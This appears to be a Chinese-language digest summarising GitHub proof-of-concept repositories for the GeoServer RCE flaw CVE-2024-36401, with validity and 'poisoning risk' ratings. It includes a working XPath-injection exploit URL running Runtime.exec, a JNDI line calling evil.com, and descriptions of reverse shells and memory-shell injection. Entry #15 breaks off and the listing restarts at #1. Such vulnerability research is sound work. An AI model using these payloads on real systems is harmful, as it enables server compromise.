*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

